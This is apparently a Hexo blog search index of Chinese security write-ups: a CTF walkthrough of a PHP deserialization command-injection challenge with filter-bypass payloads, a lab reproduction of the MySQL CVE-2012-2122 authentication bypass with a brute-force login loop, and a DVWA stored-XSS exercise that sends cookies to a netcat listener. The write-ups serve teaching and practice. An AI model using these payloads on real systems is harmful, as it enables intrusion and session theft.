<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>攻防世界WEB篇</title>
      <link href="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/"/>
      <url>/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界WEB篇"><a href="#攻防世界WEB篇" class="headerlink" title="攻防世界WEB篇"></a>攻防世界WEB篇</h1><h2 id="新手练习"><a href="#新手练习" class="headerlink" title="新手练习"></a>新手练习</h2><h3 id="unseping"><a href="#unseping" class="headerlink" title="unseping"></a>unseping</h3><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//高亮显示源代码 __FILE__ 魔术方法,总是包含一个绝对路径</span><span class="token keyword">class</span> <span class="token class-name">ease</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;  </span><span class="token comment" spellcheck="true">//定义一个类 ease</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//内部私有函数</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//__construct()为构造函数,主要用于创建对象时,为对象赋初值,当使用new实例化,会自动调用</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>     <span class="token comment" spellcheck="true">//__destruct()为析构函数,与构造函数__construct()相反,析构函数只有在对象从内存删除之前自动调用(比如对象所在的函数已经调用完毕)</span>    <span class="token comment" spellcheck="true">//当对象结束时触发该函数</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token comment" spellcheck="true">//in_array()函数搜索数组中是否存在指定的值</span>        <span class="token comment" spellcheck="true">//意思是用array创建数组,如果传入的数组中第一个参数method为ping,则执行下面的函数</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token comment" spellcheck="true">//call_user_func_array把第一个参数作为回调函数(callback)调用,把参数数组(param_arr)作为回调函数的参数传入</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>         <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token comment" spellcheck="true">//执行传入的参数,与system()类似,但不输出结果,而是返回结果的最后一行,用第二个参数array可以得到完整的结果</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回结果的值和类型,var_dump()函数用于输出变化量的相关信息</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token comment" spellcheck="true">//preg_match_all函数用于执行一个全局正则表达式匹配</span>        <span class="token comment" spellcheck="true">//过滤了很多特殊符号,关键词</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$pat_array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>            <span class="token keyword">echo</span> <span class="token string">"don't hack"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>         <span class="token comment" spellcheck="true">//魔术方法,将在序列化之后立即被调用</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token comment" spellcheck="true">//foreach遍历数组</span>        <span class="token comment" spellcheck="true">//两种方法 foreach (array_expression as $value)</span>           <span class="token comment" spellcheck="true">//foreach (array_expression as $key => $value)</span>        <span class="token comment" spellcheck="true">//将键名赋值给$k</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token comment" spellcheck="true">//将传入的数组放进waf函数中进行过滤</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;   </span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token comment" spellcheck="true">//传入post参数</span><span class="token comment" spellcheck="true">//@可以屏蔽函数执行过程中遇到问题而产生的错误、警告信息,这样用户就看不到程序出错信息</span><span class="token variable">$ctf</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先进行base64解码再进行反序列化</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ease</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token comment" spellcheck="true">//第二个参数为执行的命令,需要过滤</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ease</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>构造payload</p><pre class=" language-base64"><code class="language-base64">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo2OiJ3aG9hbWkiO319</code></pre><p>放入post执行命令</p><p><img src="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/image-20221122154657458.png" alt="image-20221122154657458"></p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h5><p>我们看到过滤的关键词</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token punctuation">(</span>\<span class="token operator">||</span><span class="token operator">&amp;</span><span class="token operator">|</span><span class="token punctuation">;</span><span class="token operator">|</span> <span class="token operator">|</span>\<span class="token operator">/</span><span class="token operator">|</span>cat<span class="token operator">|</span>flag<span class="token operator">|</span>tac<span class="token operator">|</span>php<span class="token operator">|</span>ls<span class="token punctuation">)</span><span class="token operator">/</span></code></pre><p>因为没有<code>;</code>所以无法用拼接</p><p>可以利用单引号双引号还有反斜杠绕过，比如</p><pre class=" language-php"><code class="language-php">l<span class="token string">''</span>sl<span class="token string">""</span>sl\<span class="token package">s</span></code></pre><p>就用单引号为例，传入参数</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ease</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"l''s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>生成的payload是</p><pre class=" language-base64"><code class="language-base64">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsJydzIjt9fQ</code></pre><p>看一下结果</p><p><img src="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/image-20221122164344307.png" alt="image-20221122164344307"></p><p>我们发现了一个<code>flag_1s_here</code>不知道是文件还是文件夹的，试一试</p><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>空格也被过滤掉了,绕过方式有</p><pre><code>$&#123;IFS&#125; $IFS$9&lt; 符号&lt;&gt;\x0a 换行符 %0a</code></pre><p>做一下测试，构造命令</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ease</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'l""s$&amp;#123;IFS&amp;#125;f""lag_1s_here'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>得到payload</p><pre class=" language-base64"><code class="language-base64">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyNDoibCIicyR7SUZTfWYiImxhZ18xc19oZXJlIjt9fQ</code></pre><p>发现这个文件夹内有<code>flag_831b69012c67b35f.php</code></p><p><img src="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/image-20221123145622307.png" alt="image-20221123145622307"></p><p>接下来就是要解决查看这个的问题了</p><h5 id="oct进制绕过"><a href="#oct进制绕过" class="headerlink" title="oct进制绕过"></a>oct进制绕过</h5><p>可以通过8进制来进行绕过</p><pre class=" language-linux"><code class="language-linux">ls命令$(printf "\154\163")</code></pre><p>我们需要构造的命令参数是</p><pre class=" language-linux"><code class="language-linux">$(printf "cat flag_1s_here/flag_831b69012c67b35f.php")</code></pre><p>用python脚本来转换文本</p><pre class=" language-python"><code class="language-python">str1 <span class="token operator">=</span> <span class="token string">"cat flag_1s_here/flag_831b69012c67b35f.php"</span>arr<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    test<span class="token operator">=</span>oct<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    test<span class="token operator">=</span>str<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0o'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token string">"\\"</span>c<span class="token operator">=</span>b<span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></code></pre><p>得到8进制数据</p><pre class=" language-oct"><code class="language-oct">143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160</code></pre><p>构造命令参数</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ease</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'$(printf$&amp;#123;IFS&amp;#125;"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>得到payload</p><pre class=" language-base64"><code class="language-base64">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</code></pre><p>最终得到flag<code>cyberpeace&#123;68b063dd26617895262c6bc1b45b588c&#125;</code></p><p><img src="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/image-20221123153254736.png" alt="image-20221123153254736"></p><h5 id="hex进制绕过"><a href="#hex进制绕过" class="headerlink" title="hex进制绕过"></a>hex进制绕过</h5><p>还有另外一种绕过方法，因为不能用<code>;</code>所以可以用<code>\x09</code>和<code>\x0a</code>来做命令的拼接</p><p>比如查看<code>flag_1s_here</code>文件夹</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ease</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"cd\x09f\lag_1s_here\x0al\s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>\x09</code>用在语句中间,<code>\x0a</code>用在语句末尾的截断</p><p>构造出payload</p><pre class=" language-base64"><code class="language-base64">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyMDoiY2QJZlxsYWdfMXNfaGVyZQpsXHMiO319</code></pre><p><img src="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/image-20221123154809947.png" alt="image-20221123154809947"></p><p>现在构造读取flag命令参数</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ease</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"cd\x09f\lag_1s_here\x0ac\at\x09f\lag_831b69012c67b35f.p\hp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>得到payload</p><pre class=" language-base64"><code class="language-base64">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OToiY2QJZlxsYWdfMXNfaGVyZQpjXGF0CWZcbGFnXzgzMWI2OTAxMmM2N2IzNWYucFxocCI7fX0</code></pre><p>拿到flag</p><p><img src="/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/image-20221123155039337.png" alt="image-20221123155039337"></p><h3 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h3><h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"./check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="http://broken-year.github.io/2022/05/24/phpmyadmin-webshell/">phpmyadmin后台getshell</a></li><li><a href="https://blogs.kainy.cn/2017/09/让webapp的UI体验更接近原生的小技巧/">让webapp的UI体验更接近原生的小技巧</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 身份认证绕过漏洞(CVE-2012-2122)</title>
      <link href="/2022/06/10/mysql-Authentication-bypass/"/>
      <url>/2022/06/10/mysql-Authentication-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql身份认证绕过漏洞"><a href="#Mysql身份认证绕过漏洞" class="headerlink" title="Mysql身份认证绕过漏洞"></a>Mysql身份认证绕过漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd vulhub/mysql/CVE-2012-2122docker-compose up -d</code></pre><h2 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h2><p>打开kali</p><p>用正常方式打开mysql，发现可以正常登录</p><pre class=" language-Linux"><code class="language-Linux">mysql -uroot -p123456 -h 192.168.3.151</code></pre><p><img src="/2022/06/10/mysql-Authentication-bypass/image-20220610090707580.png" alt="image-20220610090707580"></p><p>在不知道环境正确密码的情况下，在一定数量尝试后可以登录</p><pre class=" language-Linux"><code class="language-Linux">for i in `seq 1 1000`;do mysql -uroot -proot -h 192.168.3.151 ;done    </code></pre><p><img src="/2022/06/10/mysql-Authentication-bypass/image-20220610090945473.png" alt="image-20220610090945473"></p><p>结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="http://broken-year.github.io/2022/05/24/phpmyadmin-webshell/">phpmyadmin后台getshell</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xss获取cookie</title>
      <link href="/2022/06/07/xss-cookie/"/>
      <url>/2022/06/07/xss-cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次实验使用<code>dvwa</code>靶场搭建</p><p>使用工具<code>nc</code></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>首先把等级设置为<code>low</code></p><p><img src="/2022/06/07/xss-cookie/image-20220607154959588.png" alt="image-20220607154959588"></p><p>选择<code>XSS(Stored)</code>存储型</p><p><img src="/2022/06/07/xss-cookie/image-20220607155526688.png" alt="image-20220607155526688"></p><p>先测试 一下</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><img src="/2022/06/07/xss-cookie/image-20220607155954851.png" alt="image-20220607155954851"></p><p>弹出了，确定有xss漏洞</p><p>打开<code>nc</code></p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>构造xss语句</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="http://127.0.0.1:4444/?'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">+</span><span class="token string">'"/> '</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>但是这个有字数限制，可以通过burp抓包来更改</p><p><img src="/2022/06/07/xss-cookie/image-20220607160442487.png" alt="image-20220607160442487"></p><p>然后要<code>url</code>编码</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img+src%3d"http%3a//127.0.0.1%3a4444/%3f'</span><span class="token operator">%</span>2bdocument<span class="token punctuation">.</span>cookie<span class="token operator">%</span>2b<span class="token string">'"/>+'</span><span class="token punctuation">)</span><span class="token operator">%</span>3b</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>放行</p><p><img src="/2022/06/07/xss-cookie/image-20220607160703455.png" alt="image-20220607160703455"></p><p>接收到<code>cookie</code></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/05/24/phpmyadmin-webshell/">phpmyadmin后台getshell</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> xss </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin后台getshell</title>
      <link href="/2022/05/24/phpmyadmin-webshell/"/>
      <url>/2022/05/24/phpmyadmin-webshell/</url>
      
